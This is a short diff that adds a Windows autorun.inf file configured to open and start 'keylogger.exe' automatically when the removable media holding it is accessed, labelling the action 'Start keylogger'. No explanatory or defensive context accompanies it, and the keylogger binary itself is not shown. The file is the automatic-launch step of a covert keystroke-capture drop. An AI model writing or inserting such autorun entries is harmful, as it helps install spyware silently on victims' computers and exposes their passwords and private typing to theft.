@@ -1,0 +1,5 @@
+[Autorun]
+Open=keylogger.exe
+Action=Start keylogger
+Label=Started
+Icon=keylogger.exe
